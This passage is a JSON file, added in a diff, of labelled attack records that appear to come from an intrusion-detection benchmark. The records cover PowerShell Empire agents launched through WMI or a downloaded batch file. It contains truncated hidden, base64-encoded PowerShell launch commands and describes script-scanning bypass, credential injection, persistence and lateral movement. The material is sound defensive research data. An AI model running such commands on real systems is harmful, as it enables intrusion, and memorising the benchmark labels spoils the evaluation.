@@ -1,0 +1,2538 @@
+[
+ {
+  "source": "train",
+  "machine": "host-a5ce",
+  "split": "dev",
+  "attack_id": "atk-b12a4d",
+  "name": "Remote WMI launch of an encoded PowerShell Empire agent that beacons to its server",
+  "alert_from": "2000-02-07T15:41:17.523-04:00",
+  "why_alert_from": "Before this event the expert has seen only name-lookup answers to another workstation and a burst of network logons by the domain Administrator from it. Administrators do log on to workstations over the network for routine management, so that alone does not prove an attack. At this event the WMI service starts PowerShell with a base64-encoded command, half a second after those logons. WMI almost never starts PowerShell and legitimate administration does not hide its command this way, so this event is enough to conclude this is an attack.",
+  "alert_point": {
+   "id": "e121c572-dc5a-bbbc-33d1-ee660bc081c2",
+   "ts": "2000-02-07T15:41:17.523-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "SYSTEMIACOM\\Administrator",
+   "image": "powershell.exe",
+   "parent": "wmiprvse.exe",
+   "user": "SYSTEMIACOM\\Administrator",
+   "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBFAHIAcwBJAG8AbgBUAEEAYgBMAEUALgBQAFMAVgBFAFIAUwBpAE8ATgAuAE0AQQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBTAEUAbQBiAEwAWQAuAEcARQB0AFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAEkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB"
+  },
+  "ancestry": [
+   {
+    "image": "wmiprvse.exe",
+    "command_line": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+    "user": "NT AUTHORITY\\NETWORK SERVICE",
+    "ts": "2000-02-07T10:08:23.113-04:00"
+   },
+   {
+    "image": "svchost.exe",
+    "command_line": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "ts": "2000-02-07T10:08:23.096-04:00"
+   },
+   {
+    "image": "services.exe",
+    "command_line": "C:\\Windows\\system32\\services.exe",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "ts": "2000-02-07T10:08:23.095-04:00"
+   },
+   {
+    "image": "wininit.exe",
+    "command_line": "wininit.exe",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "ts": "2000-02-07T10:08:23.094-04:00"
+   }
+  ],
+  "lead_up": [
+   {
+    "name": "The attacker's computer finds this machine and logs on as the domain Administrator",
+    "n_events": 19,
+    "ts": "2000-02-07T15:41:17.018-04:00"
+   }
+  ],
+  "steps": [
+   {
+    "step": 1,
+    "name": "WMI starts a hidden, encoded PowerShell",
+    "n_events": 6,
+    "ts": "2000-02-07T15:41:17.523-04:00"
+   },
+   {
+    "step": 2,
+    "name": "One more short logon from the attacker's computer",
+    "n_events": 1,
+    "ts": "2000-02-07T15:41:18.516-04:00"
+   },
+   {
+    "step": 3,
+    "name": "The agent starts up, turns off script scanning, contacts its server and describes the machine",
+    "n_events": 34,
+    "ts": "2000-02-07T15:41:20.376-04:00"
+   },
+   {
+    "step": 4,
+    "name": "Windows housekeeping for the attacker's PowerShell",
+    "n_events": 24,
+    "ts": "2000-02-07T15:41:23.405-04:00"
+   },
+   {
+    "step": 5,
+    "name": "The attacker's administrator logons close",
+    "n_events": 4,
+    "ts": "2000-02-07T15:41:31.175-04:00"
+   },
+   {
+    "step": 6,
+    "name": "Windows records the attacker's PowerShell in its event logs",
+    "n_events": 208,
+    "ts": "2000-02-07T15:41:31.685-04:00"
+   },
+   {
+    "step": 7,
+    "name": "The agent beacons to its server every 30 seconds until the end of the day",
+    "n_events": 5945,
+    "ts": "2000-02-07T15:41:56.424-04:00"
+   },
+   {
+    "step": 8,
+    "name": "The attacker's computer connects again briefly",
+    "n_events": 4,
+    "ts": "2000-02-07T15:44:20.842-04:00"
+   }
+  ],
+  "n_malicious": 6226,
+  "n_context": 19
+ },
+ {
+  "source": "train",
+  "machine": "host-e7e0",
+  "split": "holdout",
+  "attack_id": "atk-40928c",
+  "name": "Remote WMI launch of a hidden PowerShell Empire agent that beacons to its server",
+  "alert_from": "2000-02-20T14:44:56.834-04:00",
+  "why_alert_from": "This is the first attack event in the stream: no trace of the attacker's connection is logged before it on this machine (the name lookups and logons are written about a second later). At this event the WMI service starts PowerShell with a hidden window and a base64-encoded command. WMI almost never starts PowerShell and legitimate administration does not hide its command this way, so this single event is enough to conclude this is an attack. There is no earlier attack event that could have justified an alert.",
+  "alert_point": {
+   "id": "e613ab17-de49-4c4b-b495-deeb5ef83d31",
+   "ts": "2000-02-20T14:44:56.834-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "SYSTEMIACOM\\zleazer",
+   "image": "powershell.exe",
+   "parent": "wmiprvse.exe",
+   "user": "SYSTEMIACOM\\zleazer",
+   "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8ATgBUAEEAQgBMAEUALgBQAFMAVgBlAFIAcwBJAE8ATgAuAE0AYQBKAG8AcgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAEYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0A"
+  },
+  "ancestry": [],
+  "lead_up": [],
+  "steps": [
+   {
+    "step": 1,
+    "name": "WMI starts a hidden, encoded PowerShell",
+    "n_events": 6,
+    "ts": "2000-02-20T14:44:56.834-04:00"
+   },
+   {
+    "step": 2,
+    "name": "Windows records the attacker computer's connection and network logons",
+    "n_events": 21,
+    "ts": "2000-02-20T14:44:57.901-04:00"
+   },
+   {
+    "step": 3,
+    "name": "The agent starts up, turns off script scanning, contacts its server and describes the machine",
+    "n_events": 35,
+    "ts": "2000-02-20T14:45:00.047-04:00"
+   },
+   {
+    "step": 4,
+    "name": "Windows housekeeping for the attacker's PowerShell",
+    "n_events": 8,
+    "ts": "2000-02-20T14:45:05.826-04:00"
+   },
+   {
+    "step": 5,
+    "name": "The attacker's remote logons close",
+    "n_events": 4,
+    "ts": "2000-02-20T14:45:08.969-04:00"
+   },
+   {
+    "step": 6,
+    "name": "The agent beacons to its server every five seconds",
+    "n_events": 2648,
+    "ts": "2000-02-20T14:45:11.97-04:00"
+   },
+   {
+    "step": 7,
+    "name": "The attacker's computer connects briefly again",
+    "n_events": 4,
+    "ts": "2000-02-20T14:47:58.749-04:00"
+   },
+   {
+    "step": 8,
+    "name": "The agent receives a final order, answers and exits",
+    "n_events": 16,
+    "ts": "2000-02-20T15:23:07.244-04:00"
+   },
+   {
+    "step": 9,
+    "name": "The attacker's last remote logon closes",
+    "n_events": 1,
+    "ts": "2000-02-20T15:23:08.709-04:00"
+   }
+  ],
+  "n_malicious": 2743,
+  "n_context": 0
+ },
+ {
+  "source": "train",
+  "machine": "host-6d5d",
+  "split": "holdout",
+  "attack_id": "atk-628e1c",
+  "name": "Remote WMI launch of a hidden PowerShell Empire agent that beacons to its server",
+  "alert_from": "2000-08-08T14:44:57.105-04:00",
+  "why_alert_from": "This is the very first attack event: no earlier event on this machine belongs to the attacker (the name lookups, credential check and logons from the attacker's computer are all written a few tens of milliseconds after it). At this event the WMI service starts PowerShell with a hidden window and a base64-encoded command. WMI almost never starts PowerShell and legitimate administration does not hide its command this way, so this single event is enough to conclude this is an attack. There is no attack event before it, so nothing earlier could have been enough.",
+  "alert_point": {
+   "id": "3fa2a537-962e-e694-ef87-7ef26fcebcc0",
+   "ts": "2000-08-08T14:44:57.105-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "SYSTEMIACOM\\zleazer",
+   "image": "powershell.exe",
+   "parent": "wmiprvse.exe",
+   "user": "SYSTEMIACOM\\zleazer",
+   "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8ATgBUAEEAQgBMAEUALgBQAFMAVgBlAFIAcwBJAE8ATgAuAE0AYQBKAG8AcgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAEYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0A"
+  },
+  "ancestry": [],
+  "lead_up": [],
+  "steps": [
+   {
+    "step": 1,
+    "name": "WMI starts a hidden, encoded PowerShell",
+    "n_events": 6,
+    "ts": "2000-08-08T14:44:57.105-04:00"
+   },
+   {
+    "step": 2,
+    "name": "Windows records the attacker's network logons",
+    "n_events": 21,
+    "ts": "2000-08-08T14:44:57.199-04:00"
+   },
+   {
+    "step": 3,
+    "name": "The agent starts up, turns off script scanning, contacts its server and describes the machine",
+    "n_events": 34,
+    "ts": "2000-08-08T14:45:00.468-04:00"
+   },
+   {
+    "step": 4,
+    "name": "Windows housekeeping for the attacker's PowerShell files",
+    "n_events": 8,
+    "ts": "2000-08-08T14:45:02.826-04:00"
+   },
+   {
+    "step": 5,
+    "name": "The attacker's remote logons close",
+    "n_events": 4,
+    "ts": "2000-08-08T14:45:08.93-04:00"
+   },
+   {
+    "step": 6,
+    "name": "The agent beacons to its server every five seconds",
+    "n_events": 2643,
+    "ts": "2000-08-08T14:45:12.948-04:00"
+   },
+   {
+    "step": 7,
+    "name": "The attacker's machine connects briefly again",
+    "n_events": 4,
+    "ts": "2000-08-08T14:47:58.733-04:00"
+   },
+   {
+    "step": 8,
+    "name": "The agent receives a final order, answers and exits",
+    "n_events": 16,
+    "ts": "2000-08-08T15:23:10.097-04:00"
+   },
+   {
+    "step": 9,
+    "name": "The attacker's last remote logon closes",
+    "n_events": 1,
+    "ts": "2000-08-08T15:23:11.055-04:00"
+   }
+  ],
+  "n_malicious": 2737,
+  "n_context": 0
+ },
+ {
+  "source": "train",
+  "machine": "host-c8f1",
+  "split": "dev",
+  "attack_id": "atk-c6c1b9",
+  "name": "Remote WMI launch of a hidden PowerShell Empire agent that beacons to its server",
+  "alert_from": "2000-06-02T15:41:17.567-04:00",
+  "why_alert_from": "Before this event the expert has seen only name-lookup answers to another computer on the network and Administrator network logons from it, which happen during ordinary remote administration and say nothing about intent. At this event the WMI service starts PowerShell with a hidden window and a base64-encoded command. WMI almost never starts PowerShell and legitimate administration does not hide its command this way, so this single event is enough to conclude this is an attack.",
+  "alert_point": {
+   "id": "f7010536-8076-97fe-d153-bb16aed6136b",
+   "ts": "2000-06-02T15:41:17.567-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "SYSTEMIACOM\\Administrator",
+   "image": "powershell.exe",
+   "parent": "wmiprvse.exe",
+   "user": "SYSTEMIACOM\\Administrator",
+   "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBFAHIAcwBJAG8AbgBUAEEAYgBMAEUALgBQAFMAVgBFAFIAUwBpAE8ATgAuAE0AQQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBTAEUAbQBiAEwAWQAuAEcARQB0AFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAEkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB"
+  },
+  "ancestry": [
+   {
+    "image": "wmiprvse.exe",
+    "command_line": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+    "user": "NT AUTHORITY\\NETWORK SERVICE",
+    "ts": "2000-06-02T10:16:45.739-04:00"
+   },
+   {
+    "image": "svchost.exe",
+    "command_line": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "ts": "2000-06-02T10:16:45.727-04:00"
+   },
+   {
+    "image": "services.exe",
+    "command_line": "C:\\Windows\\system32\\services.exe",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "ts": "2000-06-02T10:16:45.726-04:00"
+   },
+   {
+    "image": "wininit.exe",
+    "command_line": "wininit.exe",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "ts": "2000-06-02T10:16:45.725-04:00"
+   }
+  ],
+  "lead_up": [
+   {
+    "name": "The attacker's machine finds this computer and logs on over the network",
+    "n_events": 19,
+    "ts": "2000-06-02T15:41:17.279-04:00"
+   }
+  ],
+  "steps": [
+   {
+    "step": 1,
+    "name": "WMI starts a hidden, encoded PowerShell",
+    "n_events": 6,
+    "ts": "2000-06-02T15:41:17.567-04:00"
+   },
+   {
+    "step": 2,
+    "name": "Windows records one more network logon from the attacker",
+    "n_events": 1,
+    "ts": "2000-06-02T15:41:18.563-04:00"
+   },
+   {
+    "step": 3,
+    "name": "The agent starts up, turns off script scanning, contacts its server and describes the machine",
+    "n_events": 34,
+    "ts": "2000-06-02T15:41:20.247-04:00"
+   },
+   {
+    "step": 4,
+    "name": "Windows writes the agent's PowerShell activity into the PowerShell event logs",
+    "n_events": 212,
+    "ts": "2000-06-02T15:41:22.619-04:00"
+   },
+   {
+    "step": 5,
+    "name": "Windows housekeeping for the attacker's PowerShell files",
+    "n_events": 12,
+    "ts": "2000-06-02T15:41:23.007-04:00"
+   },
+   {
+    "step": 6,
+    "name": "The attacker's remote logons close",
+    "n_events": 4,
+    "ts": "2000-06-02T15:41:31.179-04:00"
+   },
+   {
+    "step": 7,
+    "name": "The agent beacons to its server every thirty seconds until the end of the day",
+    "n_events": 5941,
+    "ts": "2000-06-02T15:41:55.761-04:00"
+   },
+   {
+    "step": 8,
+    "name": "The attacker's machine connects briefly again",
+    "n_events": 4,
+    "ts": "2000-06-02T15:44:20.727-04:00"
+   }
+  ],
+  "n_malicious": 6214,
+  "n_context": 19
+ },
+ {
+  "source": "train",
+  "machine": "host-2758",
+  "split": "dev",
+  "attack_id": "atk-3c3aad",
+  "name": "Remote WMI launch of a hidden PowerShell Empire agent that beacons to its server",
+  "alert_from": "2000-02-06T14:44:54.115-04:00",
+  "why_alert_from": "This is the first attack event on this machine: the logon records and name-lookup answers of the remote connection are written a fraction of a second after it, and nothing of the attacker is seen before it. At this event the WMI service starts PowerShell with a hidden window and a base64-encoded command. WMI almost never starts PowerShell and legitimate administration does not hide its command this way, so this single event is enough to conclude this is an attack.",
+  "alert_point": {
+   "id": "f1f87a57-655c-fa3f-6b08-26c6239544b2",
+   "ts": "2000-02-06T14:44:54.115-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "",
+   "image": "powershell.exe",
+   "parent": "wmiprvse.exe",
+   "user": "SYSTEMIACOM\\zleazer",
+   "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8ATgBUAEEAQgBMAEUALgBQAFMAVgBlAFIAcwBJAE8ATgAuAE0AYQBKAG8AcgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAEYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0A"
+  },
+  "ancestry": [],
+  "lead_up": [],
+  "steps": [
+   {
+    "step": 1,
+    "name": "WMI starts a hidden, encoded PowerShell",
+    "n_events": 6,
+    "ts": "2000-02-06T14:44:54.115-04:00"
+   },
+   {
+    "step": 2,
+    "name": "Windows records the attacker's network logons",
+    "n_events": 20,
+    "ts": "2000-02-06T14:44:54.398-04:00"
+   },
+   {
+    "step": 3,
+    "name": "The agent starts up and turns off script scanning",
+    "n_events": 14,
+    "ts": "2000-02-06T14:45:06.12-04:00"
+   },
+   {
+    "step": 4,
+    "name": "The agent contacts its server and describes the machine",
+    "n_events": 20,
+    "ts": "2000-02-06T14:45:14.701-04:00"
+   },
+   {
+    "step": 5,
+    "name": "Three of the attacker's remote sessions close",
+    "n_events": 3,
+    "ts": "2000-02-06T14:45:22.545-04:00"
+   },
+   {
+    "step": 6,
+    "name": "The agent beacons to its server every five seconds",
+    "n_events": 2648,
+    "ts": "2000-02-06T14:45:22.899-04:00"
+   },
+   {
+    "step": 7,
+    "name": "Windows housekeeping for the attacker's PowerShell",
+    "n_events": 5,
+    "ts": "2000-02-06T14:45:24-04:00"
+   },
+   {
+    "step": 8,
+    "name": "The attacker's machine connects briefly again",
+    "n_events": 4,
+    "ts": "2000-02-06T14:47:58.911-04:00"
+   },
+   {
+    "step": 9,
+    "name": "The agent receives a final order and answers; its process ends",
+    "n_events": 16,
+    "ts": "2000-02-06T15:23:11.856-04:00"
+   },
+   {
+    "step": 10,
+    "name": "The attacker's last remote logon closes",
+    "n_events": 1,
+    "ts": "2000-02-06T15:23:12.879-04:00"
+   }
+  ],
+  "n_malicious": 2737,
+  "n_context": 0
+ },
+ {
+  "source": "train",
+  "machine": "host-fdda",
+  "split": "dev",
+  "attack_id": "atk-a549ed",
+  "name": "Remote WMI launch of a hidden PowerShell Empire agent that beacons to its server",
+  "alert_from": "2000-09-23T14:44:55.674-04:00",
+  "why_alert_from": "Before this event the expert has seen only LLMNR name-lookup answers to another workstation and one directory lookup to the domain controller, which happen all the time and say nothing about intent. At this event the WMI service starts PowerShell as zleazer with a hidden window and a base64-encoded command. WMI almost never starts PowerShell and legitimate administration does not hide its command this way, so this single event is enough to conclude this is an attack.",
+  "alert_point": {
+   "id": "0d343c85-7227-b541-f26a-f15d681f67cc",
+   "ts": "2000-09-23T14:44:55.674-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "SYSTEMIACOM\\zleazer",
+   "image": "powershell.exe",
+   "parent": "wmiprvse.exe",
+   "user": "SYSTEMIACOM\\zleazer",
+   "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8ATgBUAEEAQgBMAEUALgBQAFMAVgBlAFIAcwBJAE8ATgAuAE0AYQBKAG8AcgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAEYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0A"
+  },
+  "ancestry": [],
+  "lead_up": [
+   {
+    "name": "The attacker's computer looks this machine up on the network",
+    "n_events": 4,
+    "ts": "2000-09-23T14:44:55.599-04:00"
+   }
+  ],
+  "steps": [
+   {
+    "step": 1,
+    "name": "WMI starts a hidden, encoded PowerShell",
+    "n_events": 6,
+    "ts": "2000-09-23T14:44:55.674-04:00"
+   },
+   {
+    "step": 2,
+    "name": "Windows records the attacker's network logons",
+    "n_events": 19,
+    "ts": "2000-09-23T14:44:55.721-04:00"
+   },
+   {
+    "step": 3,
+    "name": "The agent starts up, turns off script scanning, contacts its server and describes the machine",
+    "n_events": 34,
+    "ts": "2000-09-23T14:44:59.284-04:00"
+   },
+   {
+    "step": 4,
+    "name": "Windows and PowerShell housekeeping files for the attacker's PowerShell",
+    "n_events": 9,
+    "ts": "2000-09-23T14:45:06.255-04:00"
+   },
+   {
+    "step": 5,
+    "name": "The agent beacons to its server every five seconds",
+    "n_events": 2653,
+    "ts": "2000-09-23T14:45:10.506-04:00"
+   },
+   {
+    "step": 6,
+    "name": "The attacker's remote logons close",
+    "n_events": 3,
+    "ts": "2000-09-23T14:45:22.461-04:00"
+   },
+   {
+    "step": 7,
+    "name": "The attacker's machine connects briefly again",
+    "n_events": 4,
+    "ts": "2000-09-23T14:47:58.81-04:00"
+   },
+   {
+    "step": 8,
+    "name": "The agent receives a final order, answers and exits",
+    "n_events": 16,
+    "ts": "2000-09-23T15:23:10.505-04:00"
+   },
+   {
+    "step": 9,
+    "name": "The attacker's last remote logon closes",
+    "n_events": 1,
+    "ts": "2000-09-23T15:23:11.384-04:00"
+   }
+  ],
+  "n_malicious": 2745,
+  "n_context": 4
+ },
+ {
+  "source": "train",
+  "machine": "host-efdb",
+  "split": "dev",
+  "attack_id": "atk-087660",
+  "name": "Downloaded batch file drops a hidden PowerShell Empire agent: UAC bypass, in-memory injection, credential and network reconnaissance, lateral-movement attempts, Run-key persistence",
+  "alert_from": "2000-04-08T11:23:55.857-04:00",
+  "why_alert_from": "Up to this point an analyst has seen only a browser download a batch file and the user run it, both of which happen harmlessly every day. At this event the batch file starts PowerShell with a hidden window and a long base64-encoded command. Hidden, encoded PowerShell launched straight out of a freshly downloaded script is not something legitimate software does, so this one event is enough to conclude it is an attack, and one event earlier only an ordinary-looking batch file had run.",
+  "alert_point": {
+   "id": "36790821-6828-975e-baef-5603fec7bd89",
+   "ts": "2000-04-08T11:23:55.857-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "SYSTEMIACOM\\zleazer",
+   "image": "powershell.exe",
+   "parent": "cmd.exe",
+   "user": "SYSTEMIACOM\\zleazer",
+   "command_line": "powershell  -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBFAHIAUwBJAG8ATgBUAGEAYgBMAGUALgBQAFMAVgBFAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBlAGYAXQAuAEEAcwBzAEUATQBiAEwAeQAuAEcAZQBUAFQAeQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAEkAZQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHs"
+  },
+  "ancestry": [
+   {
+    "image": "cmd.exe",
+    "command_line": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\zleazer\\Downloads\\runme.bat\" \"",
+    "user": "SYSTEMIACOM\\zleazer",
+    "ts": "2000-04-08T11:23:54.681-04:00"
+   },
+   {
+    "image": "explorer.exe",
+    "command_line": "C:\\Windows\\Explorer.EXE",
+    "user": "SYSTEMIACOM\\zleazer",
+    "ts": "2000-04-08T10:54:25.748-04:00"
+   },
+   {
+    "image": "userinit.exe",
+    "command_line": "C:\\Windows\\system32\\userinit.exe",
+    "user": "SYSTEMIACOM\\zleazer",
+    "ts": "2000-04-08T10:54:25.595-04:00"
+   },
+   {
+    "image": "winlogon.exe",
+    "command_line": "winlogon.exe",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "ts": "2000-04-08T10:54:17.677-04:00"
+   }
+  ],
+  "lead_up": [
+   {
+    "name": "The user downloads the attacker's batch file",
+    "n_events": 11,
+    "ts": "2000-04-08T11:23:24.633-04:00"
+   },
+   {
+    "name": "The downloaded batch file runs",
+    "n_events": 9,
+    "ts": "2000-04-08T11:23:54.658-04:00"
+   }
+  ],
+  "steps": [
+   {
+    "step": 1,
+    "name": "The batch file starts a hidden, encoded PowerShell",
+    "n_events": 3,
+    "ts": "2000-04-08T11:23:55.857-04:00"
+   },
+   {
+    "step": 2,
+    "name": "The first agent turns off script scanning, calls home and reports the machine",
+    "n_events": 153,
+    "ts": "2000-04-08T11:23:59.184-04:00"
+   },
+   {
+    "step": 3,
+    "name": "The browser contacts the server again and the batch file is deleted",
+    "n_events": 6,
+    "ts": "2000-04-08T11:25:01.256-04:00"
+   },
+   {
+    "step": 4,
+    "name": "The first agent checks its rights and sets up the elevation bypass",
+    "n_events": 52,
+    "ts": "2000-04-08T11:25:47.014-04:00"
+   },
+   {
+    "step": 5,
+    "name": "The maintenance task starts a stager, which starts the elevated agent",
+    "n_events": 22,
+    "ts": "2000-04-08T11:25:48.068-04:00"
+   },
+   {
+    "step": 6,
+    "name": "The elevated agent starts and calls home",
+    "n_events": 34,
+    "ts": "2000-04-08T11:25:52.492-04:00"
+   },
+   {
+    "step": 7,
+    "name": "The first agent removes the bypass values and exits",
+    "n_events": 125,
+    "ts": "2000-04-08T11:25:53.118-04:00"
+   },
+   {
+    "step": 8,
+    "name": "The elevated agent checks in with its server over and over",
+    "n_events": 10844,
+    "ts": "2000-04-08T11:26:05.884-04:00"
+   },
+   {
+    "step": 9,
+    "name": "The agent loads attack code straight into memory",
+    "n_events": 4432,
+    "ts": "2000-04-08T11:33:34.815-04:00"
+   },
+   {
+    "step": 10,
+    "name": "The agent runs its in-memory loader against the credential process",
+    "n_events": 399,
+    "ts": "2000-04-08T11:37:11.243-04:00"
+   },
+   {
+    "step": 11,
+    "name": "The agent sets itself to start again at every logon",
+    "n_events": 8,
+    "ts": "2000-04-08T11:39:19.68-04:00"
+   },
+   {
+    "step": 12,
+    "name": "The agent lists the running programs",
+    "n_events": 396,
+    "ts": "2000-04-08T11:40:20.148-04:00"
+   },
+   {
+    "step": 13,
+    "name": "The agent loads more code into memory",
+    "n_events": 398,
+    "ts": "2000-04-08T11:41:31.916-04:00"
+   },
+   {
+    "step": 14,
+    "name": "The agent prepares to capture the screen",
+    "n_events": 7,
+    "ts": "2000-04-08T12:51:52.751-04:00"
+   },
+   {
+    "step": 15,
+    "name": "The agent builds a small tool and scans the local network",
+    "n_events": 63,
+    "ts": "2000-04-08T12:58:09.045-04:00"
+   },
+   {
+    "step": 16,
+    "name": "The agent tries to log in to another machine's file sharing",
+    "n_events": 31,
+    "ts": "2000-04-08T13:07:00.103-04:00"
+   },
+   {
+    "step": 17,
+    "name": "The agent pings a long list of addresses to map the network",
+    "n_events": 2065,
+    "ts": "2000-04-08T13:14:59.845-04:00"
+   },
+   {
+    "step": 18,
+    "name": "The agent tries to run commands on other machines",
+    "n_events": 50,
+    "ts": "2000-04-08T13:19:41.76-04:00"
+   },
+   {
+    "step": 19,
+    "name": "The agent receives a final order and shuts down, and the stager ends",
+    "n_events": 14,
+    "ts": "2000-04-08T14:05:08.625-04:00"
+   },
+   {
+    "step": 20,
+    "name": "The agent's stored launcher is removed from the registry",
+    "n_events": 10,
+    "ts": "2000-04-08T15:32:39.334-04:00"
+   }
+  ],
+  "n_malicious": 19112,
+  "n_context": 20
+ },
+ {
+  "source": "train",
+  "machine": "host-5582",
+  "split": "dev",
+  "attack_id": "atk-a4959a",
+  "name": "Remote WMI launch of a hidden PowerShell Empire agent that beacons to its server",
+  "alert_from": "2000-03-13T14:45:00.502-04:00",
+  "why_alert_from": "Before this event the expert has seen only name-lookup answers to another workstation, directory and Kerberos queries to the domain controller, and network logons of a domain account with admin privileges plus a few short anonymous logons. That is what normal remote administration looks like, so it does not justify an alert by itself. At this event the WMI service starts PowerShell with a hidden window and a base64-encoded command. WMI rarely starts PowerShell and legitimate administration does not hide its command like this, so this single event is enough to conclude this is an attack.",
+  "alert_point": {
+   "id": "45a2a472-07ae-34f6-7799-df60753a4113",
+   "ts": "2000-03-13T14:45:00.502-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "SYSTEMIACOM\\zleazer",
+   "image": "powershell.exe",
+   "parent": "wmiprvse.exe",
